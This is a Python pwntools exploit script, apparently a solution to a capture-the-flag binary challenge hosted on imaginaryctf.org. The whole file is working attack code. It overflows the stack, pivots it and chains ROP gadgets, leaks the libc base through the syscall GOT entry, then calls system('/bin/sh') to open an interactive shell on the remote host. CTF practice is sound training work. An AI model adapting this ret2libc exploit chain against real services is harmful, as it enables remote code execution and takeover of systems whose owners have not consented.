from pwn import *
from time import sleep
context.log_level = 'debug'
#io = process("./vuln")
io = remote("minimal.chal.imaginaryctf.org",42042)
libc = ELF("./libc.so.6")

syscallGot = 0x404018

popRsiRdi = b"\x3a\xb4" # 1/16 times will be correct
syscallPlt = 0x401040 
newRbp = 0x404020
main1 = 0x401142
main2 = 0x40113e
ldSyscall = 0x401030

addRsp = 0x401016
popRbp = 0x40111d
ret = 0x401168

entryPoint = 0x401050

io.send(b"A"*8 + p64(syscallGot+0x10) + p64(main1))
time.sleep(1)


newStack  = p64(newRbp) + p64(ret) + p64(popRbp) + p64(newRbp) + (p64(addRsp)+b"A"*8)*135 + p64(ret) + p64(main2)
newStack += b"B"*0x10 + p64(syscallPlt) + p64(1) + p64(1) + p64(newRbp) + b"C"*0x10 + p64(ldSyscall) + p64(entryPoint) 

io.send(newStack)
time.sleep(1)


io.send(popRsiRdi)
time.sleep(1)

libc.address = u64(io.recv()[:6].ljust(8,b"\x00")) - libc.symbols["syscall"]
log.info("LIBC BASE: "  + hex(libc.address))

# process should restart
popRdi = libc.address + 0x2a3e5

exploit = b"A"*0x10 + p64(popRdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(libc.symbols["system"])
io.send(exploit)

io.interactive()